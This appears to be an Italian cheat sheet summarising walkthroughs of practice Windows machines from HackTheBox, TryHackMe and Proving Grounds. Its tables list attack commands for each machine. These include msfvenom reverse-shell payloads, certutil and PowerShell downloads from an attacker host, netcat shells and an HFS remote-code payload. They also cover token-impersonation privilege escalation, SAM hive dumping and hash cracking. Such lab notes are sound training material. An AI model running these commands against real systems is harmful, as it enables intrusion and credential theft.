- [writeup](https://medium.com/@bdsalazar/proving-grounds-heist-hard-windows-active-directory-box-walkthrough-a-journey-to-9469ae735a34)
## RCE

### Algeron

| üß† **Azione**        | üíª **Comando / Metodo**       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                 |
| -------------------- | ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SmarterMail 16.x** | 1. `python3 cve-2019-7214.py` | Dalla scansione esce che utilizza la porta `17001` e secondo questo [link](https://www.speedguide.net/port.php?port=17001) √® collegato al servizio *SmarterMail 16*. Il servizio √® vulnerabile a [RCE](https://github.com/devzspy/CVE-2019-7214). Cambiamo il parametro RHOST, LHOST e LPORT ed avviamolo con la *1.* |

- [writeup](https://medium.com/@bdsalazar/proving-grounds-algeron-easy-windows-box-walkthrough-a-journey-to-offensive-security-fa69d7f7e3ba)


### Jacko

| üß† **Azione**          | üíª **Comando / Metodo**                                                                                                                                                                                                                                               | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SmarterMail 16.x**   | 1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=135 -f exe > rev.exe`<br>2. `"certutil -split -urlcache -f http://IP_KALI/rev.exe C:\\Users\\tony\\rev.exe"`<br><br>                                                                                | Scansionando le porte troviamo sulla `8082` il servizio *H2 Database 1.4.199* che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/49384). Copiando ed eseguendo il contenuto del link notiamo che √® vulnerabile.<br>Con la *1.* creiamo la reverse shell da inserire e con la *2.* la carichiamo sulla macchina target su un path specifico. Infine avviamola<br><br>NB: seguire il [writeup](https://medium.com/@Dpsypher/proving-grounds-practice-jacko-d42c9c1e7f9e) poich√© troppo articolato |
| **Privileges**         | 1. `whoami /all`<br>2.`C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe`<br>3. `Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse`                                                                                                   | Eseguendo la *1.* notiamo che ha i permessi come `SeImpersonatePrivilege`. <br>Usiamo la *2.* per utilizzare la powershell e la *3.* per vedere se √® presente .NET importante per il privesc                                                                                                                                                                                                                                                                                                               |
| **GodPotato-NET4.exe** | 1. `certutil -split -urlcache -f http://IP_KALI/GodPotato-NET4.exe`<br>2. `.\GodPotato-NET4.exe -cmd "whoami"`<br>3. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=135 -f exe > rev2.exe`<br>4. `.\GodPotato-NET4.exe -cmd "c:\users\tony\rev2.exe"` | Scarichiamo sulla nostra macchina [GodPotato-NET4.exe](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe). Inseriamo con la *1.* il scaricato sulla macchina vittima e poi usiamo la *2.* come PoC. Con la *3.* creiamo un'altra reverse shell da inserire sulla macchina target e poi la avviamo con la *4.*                                                                                                                                                           |


- [writeup](https://medium.com/@Dpsypher/proving-grounds-practice-jacko-d42c9c1e7f9e)


### Steel Mountain

| üß† **Azione**             | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                            | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **HTTP File Server 2.3 ** | 1. `%00{.exec\|c:\Windows\System32\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.21.210.203:8000/Invoke-PowerShellTcp.ps1').}`<br>2. ![[Pasted image 20250731132658.png]]                                                                                                                                          | Sulla porta `8080` troviamo il servizio *HTTP File Server 2.3* che √® vulnerabile a RCE. Vedendo questo [video](https://www.youtube.com/watch?v=kWTnVBIpNsE&t=98s&ab_channel=IppSec) capiamo come exploitarlo: inviamo una richiesta e catturiamo con burpsuite. Scarichiamo la [reverse shell](https://raw.githubusercontent.com/tokyoneon/Chimera/refs/heads/master/shells/Invoke-PowerShellTcp.ps1) da e la carichiamo con il comando *1.* codificato in URL come in foto *2.* |
| **Unquoted Service Path** | 1. `certutil -f -split -urlcache http://IP_KALI/Invoke-AllChecks.ps1`<br>2. `msfvenom -p windows/shell_reverse_tcp -f exe-service -e x86/shikata_ga_nai -i 10 lhost=eth0 lport=1234 -o Advanced.exe`<br>3. `powershell -c "iwr -uri http://IP_KALI/Advanced.exe -outfile 'C:\Program Files (x86)\IObit\Advanced.exe'"`<br>4. `sc start AdvancedSystemCareService9` | Carichiamo con la *1.* sulla macchina `Invoke-AllChecks.ps1`. Notiamo che il servizio `Advanced SystemCare` cerca l'eseguibile `Advanced.exe` su una cartella su cui noi abbiamo i permessi di scrittura, allora creiamo una reverse shell con la *2.* ed eseguiamola con la *3.* per diventare amministratori                                                                                                                                                                   |


- [writeup](https://olivierkonate.medium.com/steel-mountain-tryhackme-5d0c95643e4)


### Alfred

| üß† **Azione**                                 | üíª **Comando / Metodo**                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                     |
| --------------------------------------------- | --------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Jenkins**                                   | 1.<br>![[Pasted image 20250731194325.png]]                                                    | Sulla porta `8080` troviamo la pagina di login *Jenkins* e riusciamo ad entrare con le credenziali `admin:admin`. Andando su MANAGE JENKINS=>SCRIPT CONSOLE abbiamo una vulnerabilit√† RCE. Utilizziamo come in foto *1.* per avviare una reverse shell.<br><br>NB: possiamo aiutarci con questo [video](https://www.youtube.com/watch?v=EKGBskG8APc&t=540s&ab_channel=IppSec) per la RCE. |
| **Privilege escalation**                      | `whoami /all`                                                                                 | L'utente attuale ha il flag `SeImpersonatePrivilege` abilitato, ci√≤ significa che vulnerabile secondo [hacktricks](https://book.hacktricks.wiki/es/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)                                                                                                                                         |
| **Scarico JuicyPotato sulla macchina target** | 1. `certutil -urlcache -split -f http://IP_KALI:80/JuicyPotato.exe`                           | su kali scarico [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) poi la carico sulla macchina vittima con la *1.*                                                                                                                                                                                                                           |
| **Nuova porta in ascolto**                    | 1. `msfvenom -p windows/shell_reverse_tcp LHOST=IP_KALI LPORT=5555 -f exe > reverse.exe` <br> | Creo con la *1.* una nuova reverse shell con una nuova porta in ascolto                                                                                                                                                                                                                                                                                                                   |
| **Carico sul target**                         | 1. `certutil -urlcache -split -f http://10.21.210.203:80/reverse.exe`<br>2. `nc -lvnp 5555`   | La carico sul target con la *1.* e metto in ascolto con la *2.*                                                                                                                                                                                                                                                                                                                           |
| **Administrator**                             | 1. `JuicyPotato.exe -l 5555 -t * -p reverse.exe`<br>                                          | divento Administrator                                                                                                                                                                                                                                                                                                                                                                     |


- [writeup](https://syedabeerahmed.medium.com/rce-jenkins-cve-2024-23897-6f56ac3ecf5d)


### Blueprint

| üß† **Azione**        | üíª **Comando / Metodo**                                                                                                                                                                        | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                          |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **osCommerce 2.3.4** | 1. `pytohn3 RCE.py http://IP_TARGET/oscommerce-2.3.4/catalog`<br>2. ![[Pasted image 20250801154952.png]]                                                                                       | Con un fuzzing directories troviamo il servizio *osCommerce 2.3.4* che √® vulnerabile a [RCE](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution?source=post_page-----bc77044228e4---------------------------------------). Usiamo la *1.* per eseguire comandi sulla macchina target. Avviamo una reverse shell come nella *2.* per entrare dentro la macchina target |
| **SAM**              | 1. `reg save HKLM\SAM sam.hiv`<br>2. `reg save HKLM\SYSTEM system.hiv`<br>3. `impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL`<br>4. `john --format=NT --wordlist=rockyou.txt hash` | Poich√© lo richiede l'esercizio prendiamo i file `sam.hiv` e `system.hiv` tramite *1.* e *2.*. Scarichiamole in locale e poi utilizziamo la *3.* per ottenere gli NTLM ed infine cracchiamo le pass con la *4.*                                                                                                                                                                                 |


- [writeup](https://5kullk3r.medium.com/blueprint-thm-ctf-writeup-bc77044228e4)
  
### Cyberlens

| üß† **Azione**             | üíª **Comando / Metodo**                                                                                                                                                                | üìù **Output / Scopo**                                                                                                                                                                                                   |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Apache Tika jp2**       | 1. `use exploit/windows/http/apache_tika_jp2_jscript`<br>2. `set rport 61777`                                                                                                          | Nel codice sorgente troviamo un riferimento alla porta `61777` dov'√® esposto il servizio *Apache Tika jp2*. Utilizziamo questa [guida](https://www.rapid7.com/db/modules/exploit/windows/http/apache_tika_jp2_jscript/) |
| **AlwaysInstallElevated** | 1. `background`<br>2. `use post/multi/recon/local_exploit_suggester`<br>3. `set session 1`<br>4. `use exploit/windows/local/always_install_elevated`<br>5. `set session 1`<br>6. `run` | Per il privilege escalation utilizziamo `suggester` con al *2.* che ci mostra che √® vulnerabile a `AlwaysInstallElevated`                                                                                               |


- [writeup](https://rtolstosheyev.medium.com/tryhackme-cyberlens-mastering-metasploit-framework-c8a116353a67)
  

### Buff

| üß† **Azione**                 | üíª **Comando / Metodo**                                                                                                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                      |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Gym Management System 1.0** | 1. `python3 48506.py http://IP_TARGET:8080`<br>2. `curl.exe http://IP_KALI/nc.exe -o nc.exe`<br>3. `nc.exe -e cmd.exe IP_KALI LPORT`                                          | Sulla porta `8080` troviamo il servizio *Gym Management System 1.0* che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/48940). Utilizziamo la *1.* per avviare una reverse shell, la *2.* per scaricare sulla macchina target `nc.exe` e la *3.* per avviare una reverse shell con pi√π permessi |
| **CloudMe 1.11.2**            | 1. `searchsploit -m 48389`<br>2. `msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe IP_KALI LPORT' -b '\x00\x0a\x0d' -f python -v payload`           | Troviamo il file `C:\Users\shaun\Documents\CloudMe_1112.exe` che √® vulnerabile a *PrivEsc*. Prendiamo l'exploit con la *1.*, inseriamo il risultato della *2.* nell'exploit.                                                                                                                               |
| **Port Forwarding**           | 1. *KALI*`./chisel server -p 9999 --reverse`<br>2. *TARGET*`chise.exe client IP_KALI:9999 R:8888:127.0.0.1:8888`<br>3. *KALI*`nc -lvnp 1234`<br>4. *KALI*`python3 exploit.py` | Poich√© la macchina non ha installato python e quindi non riusciremmo ad avviare l'exploit, facciamo un port forwarding del servizio *CloudMe* che sta sulla `8888` sulla nostra macchina ed avviamo l'exploit da l√¨. Con la *1.* e *2.* per il port forwarding, infine avviamo l'exploit con la *4.*       |


- [writeup](https://medium.com/@damaidec/buff-htb-1def896e5aa5)

### Artic

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                                                                              | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **ColdFusion 8**      | 1. `python3 xploit.py`                                                                                                                                                                               | Sulla porta `8500` scopriamo il servizio *ColdFusion 8* che √® vulnerabile a RCE [CVE-2009-2265](https://www.exploit-db.com/exploits/50057). Scarichiamo il tool e cambiamo i parametri `LHOST` e `IP` al suo interno, poi avviamolo con la *1.*                                                                                      |
| **Windows Suggester** | 1. *TARGET:*`systeminfo`<br>2. *KALI:*`python2 windows-exploit-suggester.py --update`<br>3. *KALI:*`python2 windows-exploit-suggester.py --database 2025-05-01-mssb.xls --systeminfo systeminfo.txt` | Scarichiamo [Windows Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) sulla nostra macchina, prendiamo le informazioni del target con la *1.* e carichiamole in locale in un foglio di testo. Utilizziamo la *2.* per scaricare il DB aggiornato delle vulnerabilit√† e la *3.* per identificarne una sul target |
| **MS10-059**          | 1. `certutil.exe -urlcache -f http://IP_KALI:8500/MS10-059.exe MS10-059.exe`<br>2. `.\MS10-059.exe IP_TARGET LPORT`                                                                                  | Dal passo precedente scopriamo che il target √® vulnerabile a [MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059?source=post_page-----b5d34c2a183b---------------------------------------).<br>Carichiamo l'exploit sul target con la *1.* ed avviamolo con la *2.*                                   |

- [writeup](https://medium.com/@packetsniper/hack-the-box-arcticwalkthrough-a1ae405d0cd8)

### Jeeves

| üß† **Azione**              | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                      | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                     |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Jenkins Jetty 9.4z**     | 1. ![[Pasted image 20250902224734.png]]                                                                                                                                                                                                                                                                                                                                                                      | Facendo un fuzzing directories sulla porta `50000` scopriamo il servizio *Jenkins Jetty 9.4z*.<br>Andiamo su MANAGE JENKINS > SCRIPT CONSOLE ed inseriamo il [payload](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) come nella *1.* modificando le prime due righe col nostro IP e porta         |
| **SeImpersonatePrivilege** | 1. *TARGET* `whoami /all`<br>2. *KALI* `impacket-smbserver share $(pwd) -smb2support`<br>3. *TARGET* `net use \\IP_KALI\share`<br>4. *TARGET* `copy \\IP_KALI\share\nc.exe C:\Users\user\Desktop\nc.exe`<br>5. *TARGET* `copy \\IP_KALI\share\JuicyPotato.exe`<br>6. *TARGET* `JuicyPotato.exe -l 1337 -t * -p C:\Windows\System32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe IP_KALI LPORT"` | Con la *1.* scopriamo di avere i privilegi *SeIMpersonatePrivilege*. <br>Usiamo la *2.* sulla nostra kali per simulare un server SMB e con la *4.* e *5.* carichiamo `nc.exe` e `JuicyPotato.exe` che ci servono per il privilege escalation.<br>Infine utilizziamo la *6.* per avviare una reverse shell |


- [writeup](https://emvee-nl.github.io/posts/HTB-Writeup-Jeeves/)

### BillyBoss

| üß† **Azione**                              | üíª **Comando / Metodo**                                                                                                                                                                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                 |
| ------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Nexus Repository Manager OSS 3.21.0-05** | 1. `cewl --lowercase http://IP_TARGET:8081/ \| grep -c CeWL > wordlist.txt`<br>2. ```hydra -I -f -L wordlists.txt -P wordlists.txt<br>‚Äúhttp-post-form://192.168.160.61:8081/service/rapture/session:<br>username=^USER64^&password=^PASS64^:F=403‚Äù```<br>3. `python3 exploit.py` | Sulla porta `8081` troviamo il servizio *Nexus Repository* che √® vulnerabile a RCE [CVE-2020-10199](https://www.exploit-db.com/exploits/49385) ma √® richiesta l'autenticazione.<br>Utilizziamo la *1.* per fare una wordlist per un bruteforce con la *2.*. Otteniamo le credenziali `nexus:nexus`. Cambiamo i parametri dell'exploit come user,pass e IP e poi avviamolo con la *3.* |
| **Privileges**                             | 1. `whoami /all`<br>2.`C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe`<br>3. `Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse`                                                                                                              | Eseguendo la *1.* notiamo che ha i permessi come `SeImpersonatePrivilege`. <br>Usiamo la *2.* per utilizzare la powershell e la *3.* per vedere se √® presente .NET importante per il privesc                                                                                                                                                                                          |
| **GodPotato-NET4.exe**                     | 1. `certutil -split -urlcache -f http://IP_KALI/GodPotato-NET4.exe`<br>2. `.\GodPotato-NET4.exe -cmd "whoami"`<br>3. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=135 -f exe > rev2.exe`<br>4. `.\GodPotato-NET4.exe -cmd "c:\users\tony\rev2.exe"`            | Scarichiamo sulla nostra macchina [GodPotato-NET4.exe](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe). Inseriamo con la *1.* il scaricato sulla macchina vittima e poi usiamo la *2.* come PoC. Con la *3.* creiamo un'altra reverse shell da inserire sulla macchina target e poi la avviamo con la *4.*                                      |


- [writeup](https://banua.medium.com/proving-grounds-billyboss-oscp-prep-2025-practice-10-8bbf7ed4dc0f)

### Mice

| üß† **Azione**                       | üíª **Comando / Metodo**                                                                                                                                        | üìù **Output / Scopo**                                                                                                                                                                                                                      |
| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **UniSQL**                          | 1. `./RemoteMouse-3.008-Exploit.py --target-ip IP_TARGET -v --cmd 'powershell -c "C:/Windows/Temp/nc.exe IP_KALI 80 -e cmd"'`                                  | Sulla porta `1978` troviamo il servizio *UniSQL* ceh √® vulnerabile a [RCE](https://github.com/p0dalirius/RemoteMouse-3.008-Exploit). Utilizziamo la *1.* per avviare una reverse shell                                                     |
| **Credentials Reused in .xml file** | 1. `findstr /SIM /C:"pass" *.ini *.cfg *.config *.xml`<br>2. ![[Pasted image 20250907191109.png]]<br>3. `xfreerdp /v:IP_TARGET /u:divine /p:ControlFreak11 /f` | Una volta entrati utilizziamo la *1.* per cercare credenziali sulle varie cartelle e troviamo il file `recentservers.xml` ed otteniamo la password `ControlFreak11` codificata in base64 come nella *2.*. Effettuiamo l'acceso con la *3.* |
| **Remote Mouse privesc**            |                                                                                                                                                                | Sul desktop √® presente il programma *Remote Mouse* che √® vulnerabile a [privesc](https://www.exploit-db.com/exploits/50047). Seguiamo le istruzioni per diventare utenti amministratori                                                    |

- [writeup](https://medium.com/@mu.aktepe18/mice-proving-ground-walk-through-235465dc5f1c)

### Monster

| üß† **Azione**                          | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                 |
| -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Bruteforce**                         | 1. `cewl http://IP_TARGET/ \| grep -v CeWL > wordlist.txt`                                                                                                                                                                                                                                                                                             | Applicando un fuzzing directories troviamo il percorso `/blog` dove troviamo una pagina di login del servizio *Monstra CMS 3.0.4*.<br>Proviamo le credenziali di default ma non funzionano, pertanto utilizziamo la *1.* per fare una wordlist e poi facciamo un bruteforce. Scopriamo che le credenziali valide sono `admin:wakozki` |
| **Monstra RCE**                        | 1. `searchsploit -m 52038`<br>2. `python3 exploit.py admin PASS`                                                                                                                                                                                                                                                                                       | Il servizio CMS *Monstra 3.0.4* √® vulnerabile a [RCE](https://github.com/wcheng729/Monstra-3.0.4-RCE). Utilizziamo la *2* per ottenere una cmd e da l√¨ avviamo una reverse shell                                                                                                                                                      |
| **Cracking**                           | 1. `hashcat -m 2600 hash.txt ‚Äî wordlist rockyou.txt -r rule.txt`                                                                                                                                                                                                                                                                                       | Andiamo sul file `C:\xampp\htdocs\blog\storage\database\users.table.xml` e troviamo le password hashate dell'applicazione web. Leggendo il file `C:\xampp\htdocs\blog\engine\Security.php` scopriamo quale hash viene utilizzato. Usiamo la *1.* per craccare la password                                                             |
| **XAMPP 7.3.10 Privileges Escalation** | 1. `searchsploit -m 50337`<br>2. `msfvenom -p windows/shell_reverse_tcp LHOST=IP_KALI LPORT=80 -f exe -o shell.exe`<br>3. `$file = "C:\xampp\xampp-control.ini"`<br>4. `$find = ((Get-Content $file)[2] -Split "=")[1]`<br>5. `$replace = "C:\Users\mike\Desktop\shell.exe"`<br>6. `(Get-Content $file) -replace $find, $replace \| Set-Content $file` | Analizzando il file `C:\xampp\properties.ini` scopriamo che la versione *XAMPP 7.3.10* √® vulnerabile a privesc. Usiamo la *1.* per ottenere il `.ps1` , creiamo una reverse shell con la *2.* e poi carichiamola sulla macchina target. Infine replichiamo i comandi del `.ps1` con la *3.*,*4.*,*5.* e *6.*                          |

- [writeup](https://medium.com/@anushka18599/offsec-proving-grounds-walkthrough-monster-774a871c6ad7)


## Operative System

### Legacy

| üß† **Azione**     | üíª **Comando / Metodo**           | üìù **Output / Scopo**                                                                                                                                                          |
| ----------------- | --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Metasploit**    | `use windows/smb/ms08_067_netapi` | Dalla scansione si evince che √® il vecchio sistema operativo `Windows 2000 SP3` pertanto googlo il suo nome e trovo questo [exploit](https://www.exploit-db.com/exploits/7132) |
| **Administrator** | `getuid`                          | Sono gi√† `AUTHORITY/SYSTEM`                                                                                                                                                    |

## Bypass Authentication

### HackPark

| üß† **Azione**             | üíª **Comando / Metodo**                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                        |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Bruteforce**            | 1. `hydra -l 'admin' -P rockyou.txt IP_TARGET http-post-form "PARAMETERS"`                                                       | Troviamo il `/robots.txt` dove sono presenti alcuni path tra cui `/account/login.aspx` dov'√® presente il servizio *blogengine.net 3.3.6*. Utilizziamo un bruteforce con la *1.* per ottenere le credenziali `admin:1qaz2wsx` |
| **Blogengine.net 3.3.6**  | 1. `nc -lvnp 4445`                                                                                                               | Carichiamo il file [RCE](https://www.exploit-db.com/exploits/46353) col nome `PostView.acsx` su CONTENT=>POSTS¬ß=>FILE MANAGER                                                                                                |
| **Privileges Escalation** | 1. `certutil -f -split -urlcache http://IP_KALI/PowerUp.ps1`<br>2. `powershell -c "Import-Module ./PowerUp.ps1;Invoke-AllCheks"` | Importiamo `PowerUp.ps1` con la *1.* e con la *2.* otteniamo le credenziali dell'amministratore                                                                                                                              |


- [writeup](https://medium.com/@rizzziom/hackpark-walkthrough-tryhackme-2ec45c0c1622)
## CMS

### Omni

| üß† **Azione**             | üíª **Comando / Metodo**                                                                                                                                                                                                   | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                             |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Windows Device Portal** |                                                                                                                                                                                                                           | Dalla scansione si evince che √® Windows Device Portal e googlando *Windows Device Portal default credentials*  troviamo il seguente [link](https://thingsmatic.com/2016/02/19/getting-started-with-windows-10-iot/#:~:text=The%20address%20to%20the%20Device,the%20Device%20Portal%20from%20there.) con le credenziali di default. Non funzionano ma ci danno una info importante: si tratta di un Windows 10 IoT |
| **SirepRAT**              | 1. `git clone https://github.com/SafeBreach-Labs/SirepRAT`<br>2. `python3 -m venv venv`                                                                                                                                   | Windows IoT √® vulnerabile a RCE secondo questo [link](https://github.com/SafeBreach-Labs/SirepRAT) quindi scarichiamone il contenuto *1.*, avviamo un ambiente python3 *2.* ed adesso possiamo utilizzare lo strumento                                                                                                                                                                                            |
| **RCE**                   | `python3 SirepRAT.py IP_VITTIMA GetFLaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args '/c c:\nc.exe -e powershell IP_ATTACCANTE 9001' --v --return_output`                                               | Avviamo una RCE e siamo dentro                                                                                                                                                                                                                                                                                                                                                                                    |
| **SAM**                   | 1. `reg save HKLM\SAM sam.hiv`<br>2. `reg save HKLM\SYSTEM system.hiv`<br>3. *KALI:* `impacket-smbserver share . -smb2support`<br>4. `copy sam.hiv \\IP_ATTACCANTE\share\`<br>5. `copy system.hiv \\IP_ATTACCANTE\share\` | Abbiamo privilegi sufficienti per salvare i SAM e SYSTEM in binari *1.* e *2.*. Inviamo il tutto tramite samba *3.*, *4.* e *5.*<br>                                                                                                                                                                                                                                                                              |
| **Crack password**        | 1. `impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL`<br>2. `cat hash.txt \| awk -F '{print $1":"$4}'`<br>3. `hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt`                                        | Estraiamo le password degli utenti *1.* e cracchiamole con hashcat *3.*<br>Otteniamo le credenziali `app:mesh5317`                                                                                                                                                                                                                                                                                                |
| **XML cifrato**           | 1. `$cred = Import-Clixml -Path cred.xml`<br>2. `$cred.GetNetworkCredential().Password`                                                                                                                                   | Decifrando i file `.xml` otteniamo le credenziali a root                                                                                                                                                                                                                                                                                                                                                          |

- [writeup](https://medium.com/@aperez421/omni-htb-writeup-windows-5e45aaa59278)
### HTTP File Server

| üß† **Azione**            | üíª **Comando / Metodo**                                                                                                                                                                                             | üìù **Output / Scopo**                                                                                                                                                                                                                                                       |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **HTTP File Server HFS** | 1. `?search=%00{.exec\|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1').} HTTP/1.1`                                        | Identifichiamo la versione *HTTP File Server 2.3* che √® vulnerabile a [RCE](https://github.com/thepedroalves/HFS-2.3-RCE-Exploit)                                                                                                                                           |
| **MS16032**              | 1. `infosystem`<br>                                                                                                                                                                                                 | Una volta identificato il SO `Windows Server 2012 R2` *1.* notiamo che √® vulnerabile a [MS16-032](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1)                                                              |
| **Administrator**        | 1.* KALI: *`Invoke-MS16-032 -Command "IEX(New-Object Net.WebClient).DownloadString('http://IP_KALI:PORT/shell.ps1')"`<br>2. `IEX(New-Object Net.WebClient).DownloadString('http://IP_KALI:PORT/Invoke-MS16-032.ps1` | Inserisco nell'ultima riga del file [Invoke-M16-032](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) la *1.* per invocare la shell una volta sfruttata la vulnerabilit√† e dalla macchina target eseguo la *2.* |

- [writeup]()
### Remote

| üß† **Azione**      | üíª **Comando / Metodo**                                                                                                                                                                                                                                                        | üìù **Output / Scopo**                                                                                                                                                                                                              |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **NFS**            | 1. `showmount -e IP_TARGET`<br>2. `mount -t //IP_TARGET/cartella_condivisa /mnt`                                                                                                                                                                                               | Identifichiamo una porta NFS dunque montiamo il suo contenuto sulla nostra macchina                                                                                                                                                |
| **Cracking**       | 1. `echo "admin:b8be16afba8c314ad33d812f22a04991b90e2aaa > hash`<br>2. `john hash -w /usr/share/wordlists/rockyou`                                                                                                                                                             | Dentro troviamo il file *umbraco.sdf* dove l'estensione indica dati di database. Il file contiene le credenziali hashate `admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa` che cracchiamo. La password √® `baconandcheese` |
| **Umbraco 7.12.4** | 1. `git clone https://github.com/Jonoans/Umbraco-RCE`<br>2. `python3 -m venv venv`<br>3. `pip3 install -r requirements.txt`<br>4. `python exploit.py -u USER -p PASS -w 'http://IP_TARGET/' -i IP_KALI`                                                                        | IL CMS *Umbraco 7.12.4* √® vulnerabile a [RCE](https://github.com/Jonoans/Umbraco-RCE)                                                                                                                                              |
| **Administrator**  | 1. `whoami /all`<br>2. `certutil -urlcache -split -f http://IP_KALI:80/nc64.exe`<br>3. `certutil -urlcache -split -f http://IP_KALI:80/PrintSpoofer64.exe`<br>4. *KALI:*`nc -lvnp 5555`<br>5. `./PrintSpoofer64.exe -c "C:\Users\Public\Desktop\nc64.exe IP_KALI 5555 -e cmd"` | Una volta dentro con *1.* capiamo di avere i permessi per eseguire un privilege escalation con `SetImpersonatePrivilege`. Carichiamo nc64.exe *2.* e PrintSpoofer64.exe *3.* sulla macchina target ed exploitiamo *5.*             |

- [writeup](https://cyberkareem.medium.com/hackthebox-remote-walkthrough-6dc8ba896523)

## EAR

### Previse

